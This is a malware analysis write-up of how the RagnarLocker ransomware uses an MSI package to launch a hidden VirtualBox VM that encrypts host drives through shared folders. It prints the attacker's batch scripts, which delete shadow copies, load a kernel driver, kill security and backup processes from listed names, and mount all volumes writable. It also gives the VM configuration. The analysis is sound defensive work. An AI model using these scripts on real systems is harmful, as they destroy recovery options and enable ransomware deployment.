# Analysis of the MSI vector of RagnarLocker
## Table of Contents
* [Malware analysis](#Malware-analysis)
* [Timeline](#Timeline)
* [Indicators Of Compromise (IOC)](#IOC)
* [Links](#Links)
  + [Original Tweet](#tweet)
  + [References](#References)

## Malware-analysis <a name="Malware-analysis"></a>

<h4>As first inspection, we can use Orca for inspecting the MSI package. We note that a custom action "LaunchFile" is present and execute this present reference of the file once that the extraction process of all the files on the MSI package is done.</h4>

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/RagnarLocker/2020-08-08/Pictures/InitExec.png"></img></center>

<h4>On the Directory panel, we see all the references on the directories to create by the MSI package. This creates a new folder "VirtualAppliances" on folder "ProgramFiles" and two additionnals sections "app32"+"drivers" (for x86 systems) and "app64" +"drivers" (for x64 systems) and extract the files in using theirs references.</h4>

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/RagnarLocker/2020-08-08/Pictures/TargetDir.png"></img></center>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/RagnarLocker/2020-08-08/Pictures/Path.png"></img></center>

<h4>Before extract the resources of the MSI with 7zip, we can get the list of the files which the names will be extracted, the names of the resources when they were added to the package, version on the signed resources, the size of them and theirs language ID. A list of all the resources and theirs additional informations can be consulted <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional%20Analysis/RagnarLocker/2020-08-08/CSV/FilesMSIInfos.csv">here</a>.</h4>

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/RagnarLocker/2020-08-08/Pictures/Files.png"></img></center>

<h4>We can note that the version of Virtualbox used by the attacker is the 3.0.4.0 released the 6 August 2009. The choice to choose this version is explained by one more stable version on this period of time in choosing the alternative of headless and portable for this spread method, the modern version giving the idea of portability in their design that we can see later with the examples with the case of VBOX_USER_HOME, the file associations with the registry... </h4>

<h4>We see on the properties added to the MSI package that usurp the common method used for install Virtualbox by the MSI package. This add a fake signature of a wrong version of a Virtualbox product.</h4>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/RagnarLocker/2020-08-08/Pictures/Properties.png"></img></center>
<h4>As seen above, the MSI package once extracted the files, execute a golang executable (va.exe), this only performs a reconnaissance of the current folder and gets the path as reference for add to the command to execute in launching an executable in golang. This use this way for initiating process without use special action by the MSI for reduce the detection, this will execute the install.bat file form the folder.</h4>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/RagnarLocker/2020-08-08/Pictures/ExecBAT.png"></img></center>

```
ID Build :

Go build ID: KV2n3VsFCwavIgwxQXZL/Nv7hogWa6h5VAeU6aePm/bi7Sh7YUKAi0x0t0X_VG/rnoNH8dZvwtWzl2CHS0W
```

<h4>We can also verify in editing a bat file for confirm that only launch the "install.bat" file on the current folder.</h4>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/RagnarLocker/2020-08-08/Pictures/Payload.png"></img></center>

<h4>The script executed begins to check the architecture OS for preparing the correct settings for the rest of the script.</h4>

```bat
@echo off
REM enabledelayedexpansion -> asks the preprocessor not to replace the variable with its value.
setlocal enabledelayedexpansion 

IF EXIST "%PROGRAMFILES(X86)%" (goto x64var)
set binapp=app32
set programpath=%PROGRAMFILES%\VirtualAppliances
goto letsdothis

:x64var
set binapp=app64
set programpath=%PROGRAMFILES(X86)%\VirtualAppliances
```

<h4>This declares the globals variables for the script and copies the dlls needed for the next instructions on the folders if not present.</h4>

```bat
:letsdothis
set binpath=%programpath%\%binapp%
set sysdir=%windir%\System32
cd "%programpath%"

REM copy the dll for .NET 3.5 requirement
IF NOT EXIST "%PROGRAMFILES(X86)%" (
	IF NOT EXIST "%sysdir%\msvcp71.dll" copy /y "%binpath%\msvcp71.dll" %sysdir%\msvcp71.dll
	IF NOT EXIST "%sysdir%\msvcr71.dll" copy /y "%binpath%\msvcr71.dll" %sysdir%\msvcr71.dll
	IF NOT EXIST "%sysdir%\msvcrt.dll" copy /y "%binpath%\msvcrt.dll" %sysdir%\msvcrt.dll
)
IF EXIST "%PROGRAMFILES(X86)%" (
	IF NOT EXIST "%sysdir%\msvcp80.dll" copy /y "%binpath%\msvcp80.dll" %sysdir%\msvcp80.dll
	IF NOT EXIST "%sysdir%\msvcr80.dll" copy /y "%binpath%\msvcr80.dll" %sysdir%\msvcr80.dll
)
```

<h4>The next instructions launch the service, the dlls of Virtualbox.</h4>

```bat
REM Register the appliance
%binapp%\VBoxSVC.exe /reregserver

REM launch the DLL 
regsvr32 /S "%binpath%\VBoxC.dll"
rundll32 "%binpath%\VBoxRT.dll,RTR3Init"

REM Create and Launch the service as kernel
sc create VBoxDRV binpath= "%binpath%\drivers\VBoxDrv.sys" type= kernel start= auto error= normal displayname= PortableVBoxDRV
sc start VBoxDRV
```

<h4>This stops the service of auto-discovering for avoiding to have autorun options at each volume that be mount for the shared volumes.This deletes the shadow copies and parsed all the volumes availables.</h4>

```bat
REM stop the service for avoid problem with autorun operations at each new volume mounted
sc stop ShellHWDetection
REM Remove shadow copy
vssadmin delete shadows /all /quiet
REM Detect all the volumes by regex on the help list
mountvol | find "}\" > v.txt
(For /F %%i In (v.txt) Do (
	Set freedrive=0
	FOR %%d IN (C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO (
		IF NOT EXIST %%d:\ (
			IF "!freedrive!"=="0" (
				Set freedrive=%%d
			)
		)
	)
	mountvol !freedrive!: %%i
    REM Test Media
	ping -n 2 127.0.0.1
))
```

<h4>For the detection of the volumes, this uses a regex ("}\") with the "find" command for catch the list of volumes pushed on the help menu of the command, by example in this sandbox.</h4>

```bat
   \\?\Volume{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXX}\
        *** No mount point ***

    \\?\Volume{YYYYYYYY-YYYY-YYYY-YYYY-YYYYYYYYYYY}\
        C:\

    \\?\Volume{ZZZZZZZZ-ZZZZ-ZZZZ-ZZZZ-ZZZZZZZZZZZ}\
        D:\
```
<h4>This continues in affected a share on the root fo each valid volume.</h4>

```bat
REM for each volume found this add it on the shared folders for spread effect the ransomware inside the VM
Set driveid=0
FOR %%d IN (C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO (
	IF EXIST %%d:\ (
		Set /a driveid+=1
		echo ^<SharedFolder name="!driveid!" hostPath="%%d:\" writable="true"/^> >>sf.txt
	)
)
```

<h4>This creates the configuration of the VM weaponized (micro.xml), stop the process and services before run the VM. As said before, VBOX_USER_HOME is an important point where is the xml configuration for the old Virtualbox version for making portable Virtualbox which have been removed for fixed the location of Virtualbox on the programfiles folder by Oracle few times after their acquisition.</h4>

```bat
REM Read the content and add to the XML used for the configuration of the virtual host
type vm1.txt > micro.xml
echo ^<CPU count="1"^> > pn.txt
type pn.txt >> micro.xml
type vm2.txt >> micro.xml
type sf.txt >> micro.xml
type vm3.txt >> micro.xml

REM Delete the temp files
del /q /f sf.txt
REM Stop the security process
tasklist > t.txt
findstr /G:p.txt t.txt > k.txt
FOR /F %%p IN (k.txt) DO taskkill /IM %%p /F
FOR /F %%s IN (s.txt) DO sc stop %%s
REM Delete the temp files
del /q /f *.txt
del /q /f va.exe
REM VBOX_USER_HOME is where the xml configuration of the old Virtualbox version is stored and the location VBoxSVC log file
set VBOX_USER_HOME=%programpath%
REM Start the VM without vrdp mode
"%binpath%\VBoxHeadless.exe" --startvm micro -v off
REM delete this bash script
del /q /f install.bat
```

<h4>This stop also all the sensible services and process on the system, this is the same list (on the both files) that content on the RagnarLocker and probably from the build of the source code as export list when this builds the ransomware by an argument on the compiler.</h4>

```
s.txt
=======
vss
sql
memtas
mepocs
sophos
veeam
backup
pulseway
logme
logmein
connectwise
splashtop
mysql
Dfs

p.txt
========
sql
mysql
veeam
oracle
ocssd
dbsnmp
synctime
agntsvc
isqlplussvc
xfssvccon
mydesktopservice
ocautoupds
encsvc
firefox
tbirdconfig
mydesktopqos
ocomm
dbeng50
sqbcoreservice
excel
infopath
msaccess
mspub
onenote
outlook
powerpnt
steam
thebat
thunderbird
visio
winword
wordpad
EduLink2SIMS
bengine
benetns
beserver
pvlsvr
beremote
VxLockdownServer
postgres
fdhost
WSSADMIN
wsstracing
OWSTIMER
dfssvc.exe
dfsrs.exe
swc_service.exe
sophos
SAVAdminService
SavService.exe

```

<h4>Once rebuild the configuration of the VM, we can note some interesting points, the network section is missing. Only the end of tag of the XML entity is available but isn't good formatted that indicate that the group haven't only cut in parts the configuration for the detection and for the creation of the shares of the volumes discover by the reconnaissance actions but also for adapt the network adapter as a logic of network spread. The same logic of editing the content between the both tags being already used for the shares, it cannot be excluded that the primary goal was to spread in the network of the infrastructure, given the number of vulnerabilities available for lateralization in an infrastructure this year alone, that would be largely possible.</h4>

```xml
micro.xml :

<?xml version="1.0" encoding="UTF-8"?>
<!-- Sun VirtualBox Machine Configuration -->
<VirtualBox xmlns="http://www.innotek.de/VirtualBox-settings" version="1.7-windows">
	<Machine uuid="{83e4ad9e-e46d-49cc-80f1-6bdd63e0cda7}" name="micro" OSType="WindowsXP" lastStateChange="2020-05-03T02:12:56Z">
	<ExtraData>
		<!--Allows to auto-mount the folders to overwrite on the victim system-->
		<ExtraDataItem name="GUI/SaveMountedAtRuntime" value="yes"/>
		<ExtraDataItem name="GUI/ShowMiniToolBar" value="yes"/>
		<ExtraDataItem name="GUI/MiniToolBarAlignment" value="bottom"/>
		<ExtraDataItem name="GUI/LastWindowPostion" value="363,122,640,523"/>
		<!--hide from the screen-->
		<ExtraDataItem name="GUI/Fullscreen" value="off"/>
		<ExtraDataItem name="GUI/Seamless" value="off"/>
		<ExtraDataItem name="GUI/AutoresizeGuest" value="on"/>
		<ExtraDataItem name="GUI/MiniToolBarAutoHide" value="on"/>
	</ExtraData>
	<Hardware>
		<CPU count="1">
			<HardwareVirtEx enabled="true"/>
			<!--Physical Address Extension (PAE) enabled-->
			<PAE enabled="true"/>
		</CPU>
		<Memory RAMSize="256"/>
		<Boot>
			<Order position="3" device="HardDisk"/>
		</Boot>
		<Display VRAMSize="12" monitorCount="1" accelerate3D="false"/>
		<!-- Have the default port and disable remote control (RDP server) -->
		<RemoteDisplay enabled="false" port="43399" authType="Null"/>
		<BIOS>
			<ACPI enabled="true"/>
			<IOAPIC enabled="false"/>
			<Logo fadeIn="true" fadeOut="true" displayTime="0"/>
			<BootMenu mode="MessageAndMenu"/>
			<TimeOffset value="0"/>
			<PXEDebug enabled="false"/>
		</BIOS>
		<DVDDrive passthrough="false"/>
		<FloppyDrive enabled="false"/>
		<USBController enabled="false" enabledEhci="false"/>
		<!-- Network section is missing and the end of section isn't good formatted -> </Network> -->
		<Network/>
		<UART>
			<!-- I/O base 0x3F8, IRQ 4 -> COM1 -->
			<Port slot="0" enabled="false" IOBase="0x3f8" IRQ="4" hostMode="Disconnected"/>
			<Port slot="1" enabled="false" IOBase="0x3f8" IRQ="4" hostMode="Disconnected"/>
		</UART>
		<LPT>
			<!-- I/O base 0x378, IRQ 4 -> LPT1 -->
			<Port slot="0" enabled="false" IOBase="0x378" IRQ="4"/>
			<Port slot="1" enabled="false" IOBase="0x378" IRQ="4"/>
		</LPT>
		<AudioAdapter controller="AC97" driver="DirectSound" enabled="false"/>
		<SharedFolders>
		<!-- From the reconnaissance of the volumes and here by the article as reference -->
			<SharedFolder name="1" hostPath="C:\" writable="true"/>
			<SharedFolder name="2" hostPath="E:\" writable="true"/>
		</SharedFolders>
			<!-- Needed for do the I/O actions in the both side -->
			<Clipboard mode="Bidirectional"/>
			<Guest memoryBalloonSize="0" statisticsUpdateInterval="0"/>
			<GuestProperties>
		<!-- Timestamp -> Sunday 3 May 2020 02:13:04.391 -->
        <GuestProperty name="/VirtualBox/HostInfo/GUI/LanguageID" value="C" timestamp="1588471984391676100" flags=""/>
      </GuestProperties>
    </Hardware>
    <StorageControllers>
      <StorageController name="IDE" type="PIIX4" PortCount="2">
		<!-- Attached volume with the ransomware inside -->
        <AttachedDevice type="HardDisk" port="0" device="0">
          <Image uuid="{5d09f11e-ee59-4301-a875-3555762f9008}"/>
        </AttachedDevice>
      </StorageController>
    </StorageControllers>
  </Machine>
</VirtualBox>
```

<h4>Another point to note is the fact to see the date on the configuration on the last change, she is true and can be observed on the files written by the attacker when configuring the VM.However, the VM will later be edited again to add the payloads and therefore should have this date changed (more than a week after doing the configuration). The configuration was therefore done just after installation and then left for a week before weaponized the VM (cf later in forensic inspection of the VM).</h4>

```xml
Virtualbox.xml :

<?xml version="1.0" encoding="UTF-8"?>
<!-- Sun VirtualBox Global Configuration -->
<VirtualBox xmlns="http://www.innotek.de/VirtualBox-settings" version="1.7-windows">
  <Global>
    <ExtraData>
      <ExtraDataItem name="GUI/UpdateDate" value="1 d, 2020-05-05"/>
      <ExtraDataItem name="GUI/SUNOnlineData" value="triesLeft=2"/>
      <ExtraDataItem name="GUI/LastWindowPostion" value="298,109,770,550"/>
	  <!-- Attach as last VM, the weaponized VM ( push on the top of the list) -->
      <ExtraDataItem name="GUI/LastVMSelected" value="83e4ad9e-e46d-49cc-80f1-6bdd63e0cda7"/>
    </ExtraData>
    <MachineRegistry>
      <MachineEntry uuid="{83e4ad9e-e46d-49cc-80f1-6bdd63e0cda7}" src="micro.xml"/>
    </MachineRegistry>
    <MediaRegistry>
      <HardDisks>
        <HardDisk uuid="{5d09f11e-ee59-4301-a875-3555762f9008}" location="micro.vdi" format="VDI" type="Normal"/>
      </HardDisks>
      <DVDImages/>
      <FloppyImages/>
    </MediaRegistry>
    <NetserviceRegistry>
      <DHCPServers>
		<!--- Default NAT adapter -->
        <DHCPServer networkName="HostInterfaceNetworking-VirtualBox Host-Only Ethernet Adapter" IPAddress="192.168.56.100" networkMask="255.255.255.0" lowerIP="192.168.56.101" upperIP="192.168.56.254" enabled="1"/>
      </DHCPServers>
    </NetserviceRegistry>
    <USBDeviceFilters/>
    <SystemProperties defaultMachineFolder="." defaultHardDiskFolder="." defaultHardDiskFormat="VDI" remoteDisplayAuthLibrary="VRDPAuth" webServiceAuthLibrary="VRDPAuth" LogHistoryCount="3"/>
  </Global>
</VirtualBox>
```

<h4>Now, we need to turn the VDI file which content the volume of the VM to an image of the volume IMG for to do a forensic introspection of the VM. For doing it, we use VBoxManage tool on Virtualbox folder for converting it in cloning the disk.</h4>

```bat
>VBoxManage.exe clonehd ".\filD45DC43C44044930A5265DB22D05BF15.vdi" ".\filD45DC43C44044930A5265DB22D05BF15.img" --format raw
0%...10%...20%...30%...40%...50%...60%...70%...80%...90%...100%
Clone medium created in format 'raw'. UUID: 9f347ed8-3f5f-46f0-b275-fd9c4120f09d
```

<h4>We can now inspect with a reader of raw image the content of the disk, by the way, on the logic that the VM is automatically executed, we need to found the persistence on the VM that execute the payload when starting the session in the VM. This use as persistence way the startup folders for run it with a bat file. This mount all the shared links previously done by the configuration of the VM and push as link to the virtual links on the VM. Once this did execute the ransomware with the VM argument which triggers a configuration of actions, perform by the ransomware for a special use in a VM environment vector.</h4>

```bat
@echo off
ping -n 11 127.0.0.1
net use E: \\VBOXSVR\1
for %%d in (2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33) do (if exist \\VBOXSVR\%%d net use * \\VBOXSVR\%%d)
:a
ping -n 3 127.0.0.1
C:\vrun.exe -vm
goto a
```

<h4>Ragnarlocker is organized on an execution thread of a few sub-functions via entrypoint to the end. We can compare the structure between to the incident between April 2020 and July 2020, that the same structure with some splitted code to compact to singles blocks and an additional loop for one argument.</h4>

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/RagnarLocker/2020-08-08/Pictures/EntryRagnar.png"></img></center>

<h4>This has the same argument for delete the shadow copy, list the files, enforce it and the VM mod, this only change some strings like the title of the ransom note, arguments and internal id of the group.</h4>

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/RagnarLocker/2020-08-08/Pictures/entry0.png"></img></center>

<center><table>
<tr>
    <th>Energias de Portugal</th>
    <th>Carlson Wagonlit Travel</th>
</tr>
<tr>
    <th>-backup</th>
    <th>-backup</th>
 </tr>
<tr>
    <th>-list</th>
    <th>-list</th>
 </tr>
 <tr>
    <th>-force</th>
    <th>-force</th>
 </tr>
 <tr>
    <th>-vm</th>
    <th>-vmbackup</th>
 </tr>
</table></center>

<h4>We can observe that the group still use a dedicated section in the PE to store the public key derived from the masterkey in the attacker's infrastructure for the encryption of the victim's data.</h4>

<center><table>
 <tr>
    <td></td>
    <th scope="col">Section</th>
    <th scope="col">Key</th>
  </tr>
  <tr>
    <th scope="row">Energias de Portugal</th>
    <td>keys</td>
    <td>B<_%k'=p.D$/Se7iCQ|Zsu@GKHV`2BnnP?5TY(@^'fwt"bWsp;<0Tpy25fqu]jT:</td>
  </tr>
  <tr>
    <th scope="row">Carlson Wagonlit Travel</th>
    <td>edata</td>
    <td>+RhRR!-uD8'O&Wjq1_P#Rw<9Oy?n^qSP6N{BngxNK!:TG*}\\|W]o?/]H*8z;26X0</td>
  </tr>
</table></center>

<h4>This injects a shellcode for allocating the memory the next process.</h4>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/RagnarLocker/2020-08-08/Pictures/Injectshellcode.png"></img></center>

<h4>After, perform the listing of all the files and filter the folders of the browsers and Tor and the specials files linked to the system. For avoiding to overwrite a file already encrypted this uses a tag for it.</h4>

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/RagnarLocker/2020-08-08/Pictures/GenerateListFiles.png"></img></center>

<h4>Once done, load the key with the CryptoAPI in memory form the section keys in the PE for beginning the encryption process.</h4>

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/RagnarLocker/2020-08-08/Pictures/process_key.png"></img></center>

<h4>This uses a custom edit of salsa20 algorithm on the number of couples in the "quarter-round" of ARX operations (add-rotate-XOR), bitwise addition (XOR) and rotation operations (ROR).</h4>

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/RagnarLocker/2020-08-08/Pictures/ProcessEncrypt.png"></img></center>

<h4>Here, the standard of Salsa quarter-round function, four parallel copies make a round on the encryption process.</h4>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/RagnarLocker/2020-08-08/Pictures/Salsa.png"></img></center>

<h4>For more details a dynamic analysis has done by Blaze Information Security, this can be consult <a href="https://blog.blazeinfosec.com/dissecting-ragnar-locker-the-case-of-edp/">here</a>.</h4>

<h3>Additionnal rounds</h3>

<h4>As first, we can note that the version of the MiniXP is from the windows XP SP3 that match true wit the 0.82 releases see on the desktop of the VM. This is interesting to note that the SP3 allows to support the WPA2 for wireless network, that possible to bridge to a wireless device on Virtualbox and so launch a network spread by wireless device.</h4>

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/RagnarLocker/2020-08-08/Pictures/InfoOS.png"></img></center>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/RagnarLocker/2020-08-08/Pictures/ReleaseMiniXP.png"></img></center>

<h4>We can note too that the Virtualbox guest tool has immediately been added to the VM some minutes after installation and rebooted. That the only one run key found on the registry. The difference of the hour can be observed due to the edited OS is based on UTC+1 and all the system date are on UTC. This can also be observed on the mounted volumes on the registry.</h4>

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/RagnarLocker/2020-08-08/Pictures/InstallTools.png"></img></center>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/RagnarLocker/2020-08-08/Pictures/RunKey.png"></img></center>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/RagnarLocker/2020-08-08/Pictures/Volumes.png"></img></center>

<h4>Now, we focus on the artefact sources. As custom XP OS, this doesn't properly implement Shellbags and Perfetchs, this rest only the event logs (that poor in informations, in same time that XP is normal). On XP only three events logs exists :</h4>

<ul>
    <li>AppEvent (Application events) only content RPC services errors</li>
    <li>SecEvent (Security events) that empty</li>
    <li>SysEvent (System events) content some informations but stopped by the attacker</li>
</ul>

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/RagnarLocker/2020-08-08/Pictures/Config.png"></img></center>

<h4>On parsing the SysEvent, we can get the more informations on the date of the sessions. As available interesting EventID, we have only :</h4>

<center><table>
<tr>
    <td>Event ID</td>
    <td>Description</td>
</tr>
<tr>
    <td>6005</td>
    <td>The Event log service was started.</td>
</tr>
<tr>
    <td>6006</td>
    <td>The Event log service was stopped.</td>
</tr>
<tr>
    <td>6009</td>
    <td>Show the version of XP at the startup of the user's session.</td>
</tr>
</table></center>

```bat
>$data|?{($_.EventID -eq "6006") -or ($_.EventID -eq "6005") -or ($_.EventID -eq "6009")}|Sort-Object TimeCreated -Descending|Select-Object TimeCreated,EventID,Message

TimeCreated         EventId Message
-----------         ------- -------
2020-05-05 03:25:51    6006 The Event log service was stopped.
2020-05-05 03:25:04    6009 Microsoft (R) Windows (R) 5.01. 2600 Service Pack 3 Uniprocessor Free.
2020-05-05 03:25:04    6005 The Event log service was started.
2020-05-03 05:28:02    6006 The Event log service was stopped.
2020-05-03 05:22:45    6009 Microsoft (R) Windows (R) 5.01. 2600 Service Pack 3 Uniprocessor Free.
2020-05-03 05:22:45    6005 The Event log service was started.
2020-05-02 21:09:31    6009 Microsoft (R) Windows (R) 5.01. 2600 Service Pack 3 Uniprocessor Free.
2020-05-02 21:09:31    6005 The Event log service was started.
2020-05-02 20:18:26    6006 The Event log service was stopped.
2020-05-02 20:17:31    6005 The Event log service was started.
2020-05-02 20:17:31    6009 Microsoft (R) Windows (R) 5.01. 2600 Service Pack 3 Uniprocessor Free.
2020-05-02 20:12:51    6006 The Event log service was stopped.
2020-05-02 20:12:26    6005 The Event log service was started.
2020-05-02 20:12:26    6009 Microsoft (R) Windows (R) 5.01. 2600 Service Pack 3 Uniprocessor Free.
```
<h4>Unfortunately with these Event IDs, we can only confirm the opening of sessions and not their closings.We can note that the series of reboots is probably due to the installation of specific updates that were made in the VM.</h4>

<h4>Once the date of 5 May 2020, we can't confirm the actions on the VM excepted for two date when the attacker has weaponized the VM. However not new modifications of the ini, inf, dat, drv files (system files) could not be observed in the VM, which would indicate a wait coming from the other party in charge of the data extraction to finish before send the ransomware by this second team to cover its tracks and extort a little more the victim.</h4>

<h4>That only on 9 May 2020 that the group add the batch file for make the shared links on the VM and the computer, by the empty deleted file just before push the code of final batch file indicate that the attacker has done a new text file by the contextual menu (shortcut menu by right click of the mouse), rename it in batch file and open it for pushing the code in copy/paste thanks to Virtualbox guest additions tools already installed on the VM.</h4>

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/RagnarLocker/2020-08-08/Pictures/batchedit.png"></img></center>

<h4>The final action rest the copy/paste by the guest tools of the ragnarlocker ransomware (vrun.exe) some days later on the root of the disk of the VM.</h4>

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/RagnarLocker/2020-08-08/Pictures/Ransomware.png"></img></center>

<h4>In terms of internal configuration, little has been done, by example this have let the NAT enabled that by default on the conception of the VM and match on the idea that the group want add network spread as first idea before use GPO on all infrastructure. Of course the fact to chose the custom OS MiniXP add additional advantage like the fact that the autologon is enabled by default, a small size on the VM to import, don't implement correctly the tracing options and don't have valuable security option like smartscreen, AMSI, UAC ...</h4>

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/RagnarLocker/2020-08-08/Pictures/NAT.png"></img></center>

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/RagnarLocker/2020-08-08/Pictures/AutoLogon.png"></img></center>

<h4>On the date of creation of the VDI file (12 May 2020), we can see that create just before add the ransomware and after edit the configuration that indicate that the group have do a clone of the VDI as final build and add the final payload at the last time. The share links created by the bat ch file in the startup folders overwrite existing links, so it doesn't pose too much problem for the group and reuse the build for furthering operations.</h4>

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/RagnarLocker/2020-08-08/Pictures/timefiles.png "></img></center>

<h4></h4>

<h2>Timeline</h2>
<h4>This timeline represents all the actions put in the development of the MSI package.</h4>

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/RagnarLocker/2020-08-08/Pictures/Timeline.png "></img></center>

<h2> Indicators Of Compromise (IOC) <a name="IOC"></a></h2>
<h4> The IOC can be exported in <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional%20Analysis/RagnarLocker/2020-08-08/JSON/IOC_RagnarLocker_2020-08-08.json">JSON</a> and <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional%20Analysis/RagnarLocker/2020-08-08/CSV/IOC_RagnarLocker_2020-08-08.csv">CSV</a></h4>

<h2>Links <a name="Links"></a></h2>
<h4> Original tweet: </h4><a name="tweet"></a>
<ul>
    <li><a href="https://twitter.com/JAMESWT_MHT/status/1289361303140618240">https://twitter.com/JAMESWT_MHT/status/1289361303140618240</a></li>
</ul>

<h4> References: <a name="References"></a></h4>
<ul>
<li><a href="https://docs.oracle.com/en/cloud/paas/content-cloud/administer/run-msi-installer.html">Administering Oracle Content and Experience - MSI Installer</a></li>
<li><a href="https://www.Virtualbox.org/ticket/19608">VboxHeadless ignores RemoteDisplay -> Fixed in 1.6.6</a></li>
<li><a href="https://twitter.com/blazeinfosec/status/1289157353250500608">Additionnal analysis</a></li>
</ul>
